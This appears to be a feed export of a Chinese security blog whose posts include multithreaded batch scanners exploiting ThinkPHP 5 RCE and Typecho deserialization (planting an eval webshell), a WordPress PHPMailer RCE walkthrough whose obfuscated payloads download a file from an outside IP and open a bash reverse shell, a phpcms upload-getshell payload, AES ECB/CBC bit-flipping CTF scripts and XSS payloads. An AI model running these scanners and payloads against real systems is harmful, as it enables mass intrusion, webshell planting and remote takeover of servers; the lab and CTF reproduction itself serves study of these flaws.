&apos;timeout------&gt;&gt;&gt;&gt;&gt;&gt;&apos;+self.url self.sem.release() if __name__ == &quot;__main__&quot;: urls = open(&apos;./url.txt&apos;, &apos;r&apos;) sem = threading.Semaphore(10) #最大线程数为10个 for url in urls.readlines(): url = url.strip(&apos;\n&apos;) url = url.split(&apos;%3F&apos;, 1)[0] sem.acquire() #遍历一个就获得一个线程，直到达到最大 host_thread = check(url,sem) host_thread.start()#执行check()的执行函数 使用方法：在当前页面下创建./url.txt（为需要检测的url），success.txt为含有漏洞的url。 thinkphp5thinkphp5命令执行 # -*- coding:UTF-8 -*- import requests import threading import time import sys class check(threading.Thread): #判断是否存在这个漏洞的执行函数 def __init__(self, url, sem): super(check, self).__init__() #继承threading类的构造方法，python3的写法super().__init__() self.url = url self.sem = sem def run(self): parameters = &quot;s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1&quot; try: responce = requests.get(url = self.url, params = parameters,timeout=3) body = responce.text if body.find(&apos;PHP Extension&apos;) != -1: with open(&quot;success.txt&quot;, &quot;a+&quot;) as f1: f1.write(&quot;存在tp5远程代码执行漏洞: &quot; + self.url + &quot;\n&quot;) print(&quot;[+] &quot; + self.url) else: print(&quot;[-] &quot; + self.url) except Exception,err: print(&quot;connect failed&quot;) pass self.sem.release() #执行完函数，释放线程，线程数加1 class host(threading.Thread): #遍历文件操作 def __init__(self, sem): super(host, self).__init__() #继承threading类的构造方法，python3的写法super().__init__() self.sem = sem def run(self): with open(&quot;url.txt&quot;, &quot;r&quot;) as f: for host in f.readlines(): self.sem.acquire() #遍历一个就获得一个线程，直到达到最大 host = host.strip()+&quot;/public/index.php&quot; host_thread = check(host, self.sem) host_thread.start() #执行check()的执行函数 if __name__ == &apos;__main__&apos;: sem = threading.Semaphore(10) #最大线程数为10个 thread = host(sem) #传递sem值 thread.start() 使用方法：在当前页面下创建./url.txt（为需要检测的url），success.txt为含有漏洞的url。 typechotypecho反序列化漏洞 #/usr/bin/env python # -*- coding: UTF-8 -*- import getopt,sys import requests import sys import string import time import threading class check(threading.Thread): def __init__(self, url, sem): super(check, self).__init__() #继承threading类的构造方法，python3的写法super().__init__() self.url = url self.sem = sem def run(self): headers = { &apos;User-Agent&apos;: &apos;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0&apos;, &apos;Referer&apos;: self.url, &apos;cookie&apos;: &quot;__typecho_config=YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6NDp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo4OiJBVE9NIDEuMCI7czoyMjoiAFR5cGVjaG9fRmVlZABfY2hhcnNldCI7czo1OiJVVEYtOCI7czoxOToiAFR5cGVjaG9fRmVlZABfbGFuZyI7czoyOiJ6aCI7czoyMDoiAFR5cGVjaG9fRmVlZABfaXRlbXMiO2E6MTp7aTowO2E6MTp7czo2OiJhdXRob3IiO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO3M6NTc6ImZpbGVfcHV0X2NvbnRlbnRzKCdwMC5waHAnLCAnPD9waHAgQGV2YWwoJF9QT1NUW3AwXSk7Pz4nKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fX19czo2OiJwcmVmaXgiO3M6NzoidHlwZWNobyI7fQ==&quot; } try: reqs=s.get(self.url,timeout=3,headers=headers,allow_redirects=False) #print(reqs.status_code), except IOError: #如果网站打不开将输出fail print(&quot;time out 1&quot;) urls=self.url+&quot;/p0.php&quot; urlsss=self.url+&quot;/install.php?finish=1&quot; payloads={&apos;p0&apos;:&apos;echo &quot;sectest&quot;;&apos;} try: reqss=s.post(urls,allow_redirects=False,timeout=3,data=payloads)#测试是否文件创建成功 body=reqss.text if body.find(&apos;sectest&apos;)!=-1: print(&quot;web is success-----&gt;&gt;&gt;&gt;&gt;&gt;&quot;+self.url) with open(&quot;./success.txt&quot;, &quot;a+&quot;) as f1: f1.write(self.url + &quot;\n&quot;) else: print(&quot;web is fail--------&gt;&gt;&gt;&gt;&gt;&gt;&quot;+self.url) print(&apos;\n&apos;) except IOError: #如果网站打不开将输出fail print(&quot;time out 2&quot;) self.sem.release() if __name__ == &apos;__main__&apos;: reload(sys)#同下解决中文乱码 sys.setdefaultencoding(&apos;utf-8&apos;)#解决中文乱码 f = open(&quot;./1.txt&quot;)#打开批量扫描的网站文件 s=requests.Session() sem = threading.Semaphore(10) #最大线程数为10个 for line in f.readlines():#读取每一行的网站 line=line.strip(&apos;\n&apos;)#消去换行 url=line#每行的网站赋值给url host_thread = check(url,sem) host_thread.start()#执行check()的执行函数 使用方法：在当前页面下创建./1.txt（为需要检测的url），success.txt为含有漏洞的url。]]></content>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[phpcms常见漏洞]]></title>
    <url>%2F2019%2F03%2F18%2Fphpcms%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[PHP框架什么是框架框架就是可重用代码的集合，框架的代码是框架架构的代码，不是业务逻辑代码，框架代码保护类.方法.函数等等，框架代码按照一定的规则组合起来就形成了框架。 PHP常用框架1.zendframwork: (ZF)是Zend公司推出的一套PHP开发框架。2.Yii由国人开发的重量级的框架，这个框架把代码的可重用性发挥到极致。3.CakePHP是国外的框架.4.Symfony，是一套国外的PHP开源框架。5.CodeIgniter（CI）轻量级框架，运行速度快6.CanPHP框架是一个简洁，实用，高效，遵循apache协议的php开源框架。7。Laravel 是一个简单优雅的 PHP web 开发框架，将你从意大利面条式的代码中解放出来。通过简单的、表达式语法开发出很棒的 Web 应用。8.SlimFramework是一个简单的 PHP5 框架用来创建 RESTful 的 Web 应用。9.ThinkPHP是一个快速、简单、面向对象的轻量级PHP开发框架。10.PHPUnit是一个轻量级的PHP测试框架。11、KYPHP支持多数据库，多语言，多模版，多app,多缓存，多编码格式，模板布局，自定义类，自动加载公共类库。12、initPHP是一款轻量级的php开发框架。13、SpeedPHP是一款全功能的国产PHP应用框架系统。 参考：http://baijiahao.baidu.com/s?id=1604870874054619554&amp;wfr=spider&amp;for=pc php常用cmswordpress phpcms dedecms(织梦) Ecms(帝国cms) Discuz 参考：https://www.cnblogs.com/yonge/articles/2662334.html cms常见漏洞wordpresswordpress 编写采用原生php，并不是基于框架开发。 漏洞影响版本：WordPress &lt;= 4.7.1 PHPMailer &lt; 5.2.18，此处记录下复现过程。 首先搭建环境。 下载镜像：docker pull medicean/vulapps:w_wordpress_6 启动环境： docker run -it -d -p 8888:80 medicean/vulapps:w_wordpress_6 然后交互式进入docker镜像 docker exec -it 775c7c9ee1e1 /bin/bash 这里搭建8888端口映射镜像的80 http服务，安装好之后打开存在漏洞的url http://47.106.185.69:8888//wp-login.php?action=lostpassword 这里输入admin，必须要服务器存在用户才可以成功完成攻击。 bash反弹shell首先我们进行命令执行反弹shell。 第一步在服务器端创建存在反弹shell命令的文件，第二步 bash运行反弹shell的文件。 poc构建之前先给个tip 空格 ==&gt; {substr{10}{1}{tod_log}} / ==&gt; {substr{0}{1}{spool_directory}} 第一步poc： 原poc aa(any -froot@localhost -be ${run{/usr/bin/wget --output-document /tmp/rce xx.106.185.xx/a.txt}} null) 绕过后： aa(any -froot@localhost -be ${run{${substr{0}{1}{$spool_directory}}usr${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}wget${substr{10}{1}{$tod_log}}--output-document${substr{10}{1}{$tod_log}}${substr{0}{1}{$spool_directory}}tmp${substr{0}{1}{$spool_directory}}rce${substr{10}{1}{$tod_log}}xx.106.185.xx${substr{0}{1}{$spool_directory}}a.txt}} null) xx.106.185.xx改为自己的IP，poc为访问自己IP上的a.txt并保存在自己服务器上的/tmp/rce文件里。第二步我们运行rce文件即可。 其中xx.xx.xx.xx/a.txt内容为： bash -i &gt;/dev/tcp/自己IP/6666 0&lt;&amp;1 2&gt;&amp;1 第二步poc： 原poc aa(any -froot@localhost -be ${run{/bin/bash /tmp/rce}} null) 绕过后： aa(any -froot@localhost -be ${run{${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}bash${substr{10}{1}{$tod_log}}${substr{0}{1}{$spool_directory}}tmp${substr{0}{1}{$spool_directory}}rce}} null) 实战，打开url http://47.106.185.69:8888//wp-login.php?action=lostpassword 输入admin，提交抓包。 修改host头，并且使用第一条poc。复制第一条poc到host头， 即可看到服务器创建了rce文件。43 0接下来使用第二个poc，一样的做法粘贴到host头，自己的服务器监听端口等待shell. 可以看到已经反弹回来shell。 创建shell创建shell，很简单就创建文件即可， 原poc : aa(any -froot@localhost -be ${run{/usr/bin/wget --output-document /var/www/html/shell.php xx.xx.xx.xx/zk/one.txt}} null) 绕过poc： aa(any -froot@localhost -be ${run{${substr{0}{1}{$spool_directory}}usr${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}wget${substr{10}{1}{$tod_log}}--output-document${substr{10}{1}{$tod_log}}${substr{0}{1}{$spool_directory}}var${substr{0}{1}{$spool_directory}}www${substr{0}{1}{$spool_directory}}html${substr{0}{1}{$spool_directory}}shell.php${substr{10}{1}{$tod_log}}xx.xx.xx.xx${substr{0}{1}{$spool_directory}}zk${substr{0}{1}{$spool_directory}}one.txt}} null) 即可成功创建，连接菜刀即可， xx.xx.xx.xx/zk/one.txt写一句话木马即可。 然后连接shell.php菜刀即可。 参考：https://www.cnblogs.com/ssooking/p/8893264.html phpcmsphpcms任意文件上传getshell为了方便复现，源码下载。 链接: https://pan.baidu.com/s/1geNQfyb 密码: gxsd 安装成功后，打开注册页面。 http://127.0.0.1/phpcms/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1 直接post如下poc，然后提交即可返回shell地址。 poc:siteid=1&amp;modelid=11&amp;username=123456&amp;password=123456&amp;email=123456@qq.com&amp;info[content]=&lt;img src=http://files.hackersb.cn/webshell/antSword-shells/php_assert.php#.jpg&gt;&amp;dosubmit=1&amp;protocol= 注意：帐号或者邮件不能与别人重复。否则无法报错返回shell地址，但是已经创建。 返回shell地址，直接连接即可。 其中src=xx.xx.xx可以搭建在自己公网上shell文件，写马。让服务器下载。 自己备用。http://47.106.185.69/a.php 参考：https://www.hackersb.cn/hacker/219.html]]></content>
      <tags>
        <tag>web漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[钟馗之眼简单使用]]></title>
    <url>%2F2019%2F03%2F13%2F%E9%92%9F%E9%A6%97%E4%B9%8B%E7%9C%BC%2F</url>
    <content type="text"><![CDATA[简介2013年，知道创宇基于互联网大数据基础测绘的理念，打造了“ZoomEye”(钟馗之眼)网络空间安全搜索引擎，针对全球网络空间基础设施、网络设备进行指纹特征检索，开创了国内网络空间资源测绘工作的先河。 钟馗之眼是一个检索网络空间节点的搜索引擎。通过后端的分布式爬虫引擎（无论谁家的搜索引擎都是这样）对全球节点的分析，对每个节点的所拥有的特征进行判别，从而获得设备类型、固件版本、分布地点、开放端口服务等信息。 ZoomEye 支持公网设备指纹检索和 Web 指纹检索 网站指纹包括应用名、版本、前端框架、后端框架、服务端语言、服务器操作系统、网站容器、内容管理系统和数据库等。设备指纹包括应用名、版本、开放端口、操作系统、服务名、地理位置等 搜索常见命令定位国家--- country:US 搜索城市--- city:xx 搜索组件--- app:组件名 搜索版本--- ver:5.0 搜索端口--- port:80 搜索服务名-- service：SSH 搜索操作系统- OS:Linux 搜索网段--- cidr:1.1.1.1/24 指定网站域名搜索-- site:www.baidu.com 指定主机名--- hostname:www.baidu.com 指定设备名--- device:router 指定首页关键词--- keyword:sec 快捷键： 显示帮助 shift+/ 隐藏该帮助 ESC 回到首页 shift 高级搜索 Shift +s 聚焦搜索框 s]]></content>
      <tags>
        <tag>杂</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[aes加密的安全问题]]></title>
    <url>%2F2019%2F03%2F09%2Faes%E5%8A%A0%E5%AF%86%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98%2F</url>
    <content type="text"><![CDATA[本文由安全客原创发布转载，请参考转载声明，注明出处： https://www.anquanke.com/post/id/173088 aes加密简介AES算法全称Advanced Encryption Standard,是DES算法的替代者，旨在取代DES成为广泛使用的标准，于2001年11月26日发布于FIPS PUB 197，并在2002年5月26日成为有效的标准。2006年，高级加密标准已然成为对称密钥加密中最流行的算法之一。 AES是典型的对称加密算法，对称加密不同于md5 sha的哈希摘要算法，对称加密是可逆的，通常是明文+密钥，再利用算法来加密成密文，如果要还原也很简单，只要根据密钥+密文+生成算法的逆运算，即可解出，对称加密特点为可逆，并且加密解密都是使用同一个密钥，而非对称加密则是公钥私钥加解密模式这里不做讨论。 aes加密五种模式aes加密的方式有五种工作体制。 1.电码本模式（Electronic Codebook Book (ECB)） 这种模式主要是将明文划分为几个明文段，分块加密，但是加密密钥是相同的。 2.密码分组链接模式（Cipher Block Chaining (CBC)） 这种模式是先将明文切分成若干小段，然后每一小段与初始块或者上一段的密文段进行异或运算后，再与密钥进行加密。 3.计算器模式（Counter (CTR)）4.密码反馈模式（Cipher FeedBack (CFB)）5.输出反馈模式（Output FeedBack (OFB)） 其中分组如，aes-128-ecb即为16字节为一组，16字节即为128位。 其他三种模式较为复杂，本文仅讨论前两种加密的安全性。 aes-ecb加密 aes-ecb加密是将一段明文，按照固定长度分组，然后对每一个分组，按照算法使用固定的密钥进行加密。假设123456加密。那么123为一组加密，456为一组加密，然后两段明文加密后的密文拼在一起，就算完整的密文。 注意：这里每一组的加密都是使用相同的密钥，相同的算法，所以在这种机制下，很可能出现安全问题。 比如：在身份认证中，查询用户是否是管理员还是普通用户，如果is_root=1则为管理员，如果不为1则为普通用户，如果采用aes-ecb加密，对原文进行分组加密。 明文：user_id:1.000000 is_root:0（其中is_root来判断是否为管理员。） 然后用一段密钥加算法进行加密。 这种提交的加密数据是在cookie中提交，明文不可控，但是密文是可控的，但由于是进行分组进行，所以我们可以推算出每一分组明文对应的密文，假设明文八个一组来进行加密，分组后变为 （提示：仅仅是假设理想情况八位，实际并不是） 第一组：is_user 第二组：1.000000 第三组: is_root: 第四组： 0（不够的八位自动填充） 其中user_id 通常情况下我们前端可以修改，进行修改为1.000000，此时原文被加密之后为四组 每组为八个数字的密文 假设加密后密文为 c4ca4238a0b923820dcc509a6f75849b 在cookie中被提交，将密文分为四组 c4ca4238 a0b92382 0dcc509a 6f75849b 此时密文我们是可控的，如果正常提交，服务器解密之后为user_id:1.000000 is_root:0，很显然我们不是管理员，但是如果将第二组密文和第四组密文替换呢，那么user_id就是0，is_root就是1.000000。服务器就解析为user_id:0xxxxxxx(xx为填充字符) is_root:1.000000，显然我们不需要知道密钥，同样可以进行绕过。 还有一则在转账中，如果采用aes-128-ecb加密，在cookie中使用ecb分组加密，比如 付款人账户：XXX //假设密文abc收款人账户：XXX //假设密文efg 试想一下，一旦这个分组是刚好分为四组，我们仅仅将abc与efg交换，那不就造成了支付收款反转，几乎不需要什么技术就可以造成严重的攻击。 ctf-案例接下来以真实题目来进行详解。 ctf address：https://mixer-f3834380.challenges.bsidessf.net/（国外的一道ctf） 首先尝试输入admin admin 登陆。 返回内容重点为红色框内的东西，需要使得第三个参数 is_admin=1即可获得flag，但是session cookie并不是这个题关注的点，接下来就是抓包分析参数。修改参数。 经测试修改url，get cookie post传参都不能改变is_admin的值，所以只有一种可能，是在cookie里的user参数里加密了，然后传递给服务器，我们get参数传入的账号密码被服务器端加密，然后服务器返回来加密后的user信息。 接下来测试是何种加密，测试为aes-ecb加密，那么是如何确定的呢， 由于ecb是分组加密，所以一旦一组的密文我们修改了，其他组的密文解密之后是正常的，而被我们修改了的密文解密会是乱码，所以我们随便修改下user参数。 可以看到报错，并且第一组的密文解密后是乱码，而其他组的加密解密后为正常，所以猜测这一定是aes-ecb的分组加密的方式， 此时，我们应该先确定分组，几个为一组，先破坏第一组加密然后破坏第二组加密，然后确定解密后json数据为， {&quot;first_name&quot;:&quot;admin&quot;,&quot;last_name&quot;:&quot;admin&quot;,&quot;is_admin&quot;:0} 总共为55个字符， 服务器密文为：d37c125ab4eae2ed02428d6d619016b06500bafffbeebe0c011977ad06c6946a45ba82569e93332195a36e61ae1fe26b325f7afd1eaa5ee8bb11efe6eebc5b54 为128个字符，五十五个字符补位为64个字符，分组测试破坏每一组，测试到一组明文16个字符，加密密文为32个字符。 明文分为四组，一组16个字符，密文分为四组，一组32个字符。 d37c125ab4eae2ed 02428d6d619016b0 6500bafffbeebe0c 011977ad06c6946a 45ba82569e933321 95a36e61ae1fe26b 325f7afd1eaa5ee8 bb11efe6eebc5b54 可控的范围是我们输入的账号密码 admin admin。 {“first_name”:” 为十五个字符，我们首先构造账号为 a1.0000000000000} 其中a是为了填充第一组，这样第一组就是{“first_name”:”a,这样剩下的1.0000000000000}就是十六个字符为一组，第二组就是1.0000000000000}，这样服务器加密后返回的第33-64位加密就是1.0000000000000}，我们让服务器帮我们加密，这样我们就不需要知道密钥和算法，让服务器帮我们加密任何我们想要的东西，提交数据。 可以看到服务器返回了加密后的内容。我们截取第33位-64位字符。即为1.0000000000000}的密文。 3af6e4a9e05c702b02f9f4288c1c605c 接下来就是需要填充位数。我们让服务器解密的json数据最后的0｝为第65 66位，因为如果这样的话，前64位刚好是四组，65 66为一组，正好将它32位的密文替换成我们构造的密文。 {“first_name”:”admin”,”last_name”:”admin”,”is_admin”:0} 五十五位的字符串，我们让好账号变为admin12345678900,那么字符串就是66位，正好符合多余出来的两位是0｝，最后这两位被填充之后的密文同样是32位，这样就可以替换我们构造的32位密文。 可以看到服务器构造成功得到flag。 总结一下上面思路，我们根据每一组的加密密文长度固定明文长度固定，所以填充位数，然后让我们想要的数据成为单独的一组，让服务器进行加密，这样我们就可控制任意明文加密，然后修改cookie里提交的密文，填充字节，让我们需要的密文位置成为单独的一组，然后替换我们之前构造的一组数据，这样就可以绕过。 此题值得一题的是双引号单引号反斜线等被过滤了，所以师傅们其他需要引入双引号等的不用尝试了。 aes-cbc加密这种模式是先将明文切分成若干小段，然后每一小段与初始块或者上一段的密文段进行异或运算后，再与密钥进行加密。aes- IV：用于随机化加密的比特块，保证即使对相同明文多次加密，也可以得到不同的密文。 秘钥：用于加密。 密文块0：第一组密文被加密后的内容。（同样也是第二组明文加密过程中的IV） cbc加密方式不难理解，将一串明文进行分组，举例 123456789 123为第一组，456为第二组，789为第三组，将123与IV异或加密（加密中IV只在第一次异或有用），得到的异或后的密文与密钥加密，假设此时第一组加密的最终密文为abc，那么456先于第一组的密文abc异或加密，得到的异或密文在与密钥加密，假设第二组最终密文为def，往复循环，def与第三组明文异或，然后和密钥加密，假设密文ghi，那么最终密文就是 abcdefghi并且将iv发送。 其中值得一提的是初始始化向量IV每次随即初始化，所以即使相同的字符串也不会有相同的密文。 cbc字节反转攻击那么这种在这种加密的方式下，并不安全，问题出在异或加密这里，在讲解字节反转攻击前先了解下异或加密。 异或 xor 符号表示为 ^ ，计算机中 两个数字异或，相同为0，不同为1。 1^1=0 0^1=1 如果是字母异或加密，a^b，那么首先转化为ascii编码，然后二进制，对每一位进行异或得到的结果转为十进制，在ascii编码出来。 异或有一个特性，任意值与自己本身做异或运算的结果都是0，任意值与0做异或运算的结果都是自己。本身a^b=乱七八糟，a^a则为空，但是a^a^任意字母=任意字母。 在CBC解密中，如图A是第一组的密文，B是第二组被解密的密文（未异或），C是明文。C=A^B。那么B=C^A，且A^B^C=0。如果我们更改A，A为我们可控的密文，C=A^B,如果我们使A=B^X，B=C^A,所以A=C^A^X,C=C^A^X^B=B^X^B=X。这里X是我们需要的任意字符，这便是CBC字节反转攻击的核心，这样一来C的明文就完全可控了。 简单的登录-cbc字节反转原理说了很多，那么接下来实战一下。 实验吧题目：http://ctf5.shiyanbar.com/web/jiandan/index.php 首先，输入框随便输入，然后发送请求抓包，看到返回包的头请求有tips，test.php。访问test.php即可看到源码。 &lt;?php define(&quot;SECRET_KEY&quot;, &apos;***********&apos;); define(&quot;METHOD&quot;, &quot;aes-128-cbc&quot;); error_reporting(0); include(&apos;conn.php&apos;); function sqliCheck($str){ if(preg_match(&quot;/\\\|,|-|#|=|~|union|like|procedure/i&quot;,$str)){ return 1; } return 0; } function get_random_iv(){ $random_iv=&apos;&apos;; for($i=0;$i&lt;16;$i++){ $random_iv.=chr(rand(1,255)); } return $random_iv; } function login($info){ $iv = get_random_iv(); $plain = serialize($info); $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);//$plain为要加密的明文，METHOD加密方法，SECRET_KEY是秘钥，OPENSSL_RAW_DATA为数据格式，$iv随机生成的初始化向量。 setcookie(&quot;iv&quot;, base64_encode($iv)); setcookie(&quot;cipher&quot;, base64_encode($cipher)); } function show_homepage() { global $link; if(isset($_COOKIE[&apos;cipher&apos;]) &amp;&amp; isset($_COOKIE[&apos;iv&apos;])) { $cipher = base64_decode($_COOKIE[&apos;cipher&apos;]); $iv = base64_decode($_COOKIE[&quot;iv&quot;]); if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv)) { $info = unserialize($plain) or die(&quot;&lt;p&gt;base64_decode(&apos;&quot;.base64_encode($plain).&quot;&apos;) can&apos;t unserialize&lt;/p&gt;&quot;); $sql=&quot;select * from users limit &quot;.$info[&apos;id&apos;].&quot;,0&quot;; $result=mysqli_query($link,$sql); if(mysqli_num_rows($result)&gt;0 or die(mysqli_error($link))){ $rows=mysqli_fetch_array($result); echo &apos;&lt;h1&gt;&lt;center&gt;Hello!&apos;.$rows[&apos;username&apos;].&apos;&lt;/center&gt;&lt;/h1&gt;&apos;; } else{ echo &apos;&lt;h1&gt;&lt;center&gt;Hello!&lt;/center&gt;&lt;/h1&gt;&apos;; } } else { die(&quot;ERROR!&quot;); } } } if(isset($_POST[&apos;id&apos;])){ $id = (string)$_POST[&apos;id&apos;]; if(sqliCheck($id)) die(&quot;&lt;h1 style=&apos;color:red&apos;&gt;&lt;center&gt;sql inject detected!&lt;/center&gt;&lt;/h1&gt;&quot;); $info = array(&apos;id&apos;=&gt;$id); login($info); echo &apos;&lt;h1&gt;&lt;center&gt;Hello!&lt;/center&gt;&lt;/h1&gt;&apos;; }else{ if(isset($_COOKIE[&quot;iv&quot;])&amp;&amp;isset($_COOKIE[&apos;cipher&apos;])){ show_homepage(); }else{ echo &apos;&lt;body class=&quot;login-body&quot; style=&quot;margin:0 auto&quot;&gt; &lt;div id=&quot;wrapper&quot; style=&quot;margin:0 auto;width:800px;&quot;&gt; &lt;form name=&quot;login-form&quot; class=&quot;login-form&quot; action=&quot;&quot; method=&quot;post&quot;&gt; &lt;div class=&quot;header&quot;&gt; &lt;h1&gt;Login Form&lt;/h1&gt; &lt;span&gt;input id to login&lt;/span&gt; &lt;/div&gt; &lt;div class=&quot;content&quot;&gt; &lt;input name=&quot;id&quot; type=&quot;text&quot; class=&quot;input id&quot; value=&quot;id&quot; onfocus=&quot;this.value=\&apos;\&apos;&quot; /&gt; &lt;/div&gt; &lt;div class=&quot;footer&quot;&gt; &lt;p&gt;&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Login&quot; class=&quot;button&quot; /&gt;&lt;/p&gt; &lt;/div&gt; &lt;/form&gt; &lt;/div&gt; &lt;/body&gt;&apos;; } } ?&gt; 前提：这一关不是单纯注入饶过的，肯定要利用cbc字节反转攻击。 1.首先直接看在哪里可以得到flag，没传入ID参数的时候，如果cookie建立了iv 和 cipher参数，那么就可以调用show_homepage，执行sql查询，flag在数据库里查询。 2.但是肯定要传参id，先生成iv 和 cipher，将id=X该数组进行序列化之后，以序列化结果和一个bs64编码随机数iv进行cbc加密生成密文cipher,加密算法为aes-128-cbc，此时就要考虑cbc字节反转了，128位，按十六字节分组。生成iv和cipher之后url编码返回请求头，生成细节参考自定义login函数。 3.sql查询语句拼接了一个0，所以我们只要注释掉0便可进行我们的查询。所以可以利用cbc字节翻转攻击更改密文，更改解密后的id，从而绕过进行sqlwaf，cookie传入参数 cipher和iv,base64解码然后aes解密，php反序列化，如果不能反序列化，则输出base64编码，否则就sql语句拼接查询。如果有结果回显，否则输出hello。 综上，只要我们能够CBC进行字节反转就可以执行sql查询，就可以进行查询flag。 接下来第一步首先要cbc字节反转，修改密文中的id。不妨先测试下位数，如果传入id=12（因为我们要修改为1#），则序列化后内容为 a:1:{s:2:&quot;id&quot;;s:2:&quot;12&quot;;} 由于我们需要分组，aes-128-cbc，128位16字节分组 第一组： a:1:{s:2:&quot;id&quot;;s: 第二组： 2:&quot;12&quot;;} 10中的0是第二组的第五个字符，所以需要更改第5个字符，右偏移四个字符，第一组也要向右偏移四个字符。接下来就是cbc字节反转脚本。 # -*- coding:utf8 -*- from base64 import * import urllib cipher=&apos;fn060OBP%2FyLIGYrD9bi%2FlWWAS9RIWvEtALaV26kuB%2F8%3D&apos;#加密后的密文 cipher_raw=b64decode(urllib.unquote(cipher))#首先urldecode解码，然后base64解码 cipher_raw_list=list(cipher_raw)#将解码的密文分组 py=4#偏移量为4 A=cipher_raw_list[py]#要异或第二组密文的位置 C=&apos;2&apos;#第二组被替换的明文 X=&apos;#&apos;#将第二组替换掉的明文 cipher_raw_list[py]=chr(ord(A)^ord(C)^ord(X))#将偏移量为4的替换。 cipher_new=&apos;&apos;.join(cipher_raw_list)#使用&apos;&apos;将每一个字符连接起来， cipher_new=urllib.quote(b64encode(cipher_new))#将替换完的密文base64编码，urlencode编码。 print cipher_new#打印出最终密文 其中特意将ACX等变量对应上文所讲的参数。可参考上面cbc字节反转配合图来理解。然后生成反转后的密文： fn060PFP/yLIGYrD9bi/lWWAS9RIWvEtALaV26kuB/8%3D 此时提交密文发送服务器会返回base64编码字符串无法反序列化。 原因为下面这句。 接下来我们需要修改IV，原理很简单，我们分为两组来进行加解密，第一组密文只参与第二组的异或，第一组修改完成后，第二组的解密是完全没有问题的，但是第一组被我们修改了一个字符，但是异或的IV还是原来的IV，必须要修改IV才能使第一组正常异或，得到结果。还是上述原理，三次异或，控制想要的结果。 这里在看图， A：这里特别要说明注意，A是我们第一次字节反转之后的明文（序列化状态）B：原来的IVC：字节反转后解密后的第一组（未被异或）D: 正常的序列化字符串 ‘a:1:{s:2:”id”;s:’E：新的IV A=B^C,因为我们A是字节反转这里我们可以看到，IV是原来的IV，但是A和C都是字节反转后的，所以A必然是个无法反序列化的明文，我们修改B也就是IV，使得异或得到正常的序列化字符串。 B=A^C,我们需要得到的结果是D=E^C，而C=B^A，所以D=E^B^A,那么E=B^A^D。 //建议初学者自己多分析下逻辑，多写写，干想很头疼。 接下来是IV修改的脚本。 # -*- coding:utf8 -*- __author__=&apos;pcat@chamd5.org&apos; from base64 import * import urllib iv=&apos;erUDGVSvM4Kab3ztg8vT8Q%3D%3D&apos; B=b64decode(urllib.unquote(iv)) D=&apos;a:1:{s:2:&quot;id&quot;;s:&apos; A=b64decode(&apos;eFoXA0j/x2Em/bhfgeLzXjI6IjEjIjt9&apos;) iv_new=&apos;&apos; for i in range(16): iv_new+=chr(ord(A[i])^ord(D[i])^ord(B[i])) iv_new=urllib.quote(b64encode(iv_new)) print iv_new 替换掉原来的IV，即可正常sql查询。 至此，此题的cbc反转我们已经完成了，剩下的注入原理一样，注入不是本题的目的，也就不再发剩下的脚本了。CBC还是要自己写一下用图理解一下。 其余加密问题，后续我会补充到本文。 参考：https://www.yourhome.ren/index.php/sec/366.html参考：实验吧pcat师傅的writeup]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XSS姿势小集]]></title>
    <url>%2F2019%2F03%2F04%2FXSS%E5%A7%BF%E5%8A%BF%E5%B0%8F%E9%9B%86%2F</url>
    <content type="text"><![CDATA[前言由于XSS攻击原理很简单，用百度一段话，本文重点在记录一些绕过姿势。 XSS是一种经常出现在web应用中的计算机安全漏洞，它允许恶意web用户将代码植入到提供给其它用户使用的页面中。比如这些代码包括HTML代码和客户端脚本。攻击者利用XSS漏洞旁路掉访问控制——例如同源策略(same origin policy)。这种类型的漏洞由于被骇客用来编写危害性更大的网络钓鱼(Phishing)攻击而变得广为人知。对于跨站脚本攻击，骇客界共识是：跨站脚本攻击是新型的“缓冲区溢出攻击“，而JavaScript是新型的“ShellCode”。 个人理解：XSS较为简单，理解起来也比较简单，一部分代码可控，并且显示在网页中，并且能够解析，就能够造成XSS漏洞，一般解析javascript来造成攻击。 转先知社区上几个payload（无过滤）参考：https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet &lt;scirpt&gt; &lt;scirpt&gt;alert(&quot;xss&quot;);&lt;/script&gt; &lt;img&gt; &lt;img src=1 onerror=alert(&quot;xss&quot;);&gt; &lt;input&gt; &lt;input onfocus=&quot;alert(&apos;xss&apos;);&quot;&gt; 竞争焦点，从而触发onblur事件 &lt;input onblur=alert(&quot;xss&quot;) autofocus&gt;&lt;input autofocus&gt; 通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发 &lt;input onfocus=&quot;alert(&apos;xss&apos;);&quot; autofocus&gt; &lt;details&gt; &lt;details ontoggle=&quot;alert(&apos;xss&apos;);&quot;&gt; 使用open属性触发ontoggle事件，无需用户去触发 &lt;details open ontoggle=&quot;alert(&apos;xss&apos;);&quot;&gt; &lt;svg&gt; &lt;svg onload=alert(&quot;xss&quot;);&gt; &lt;select&gt; &lt;select 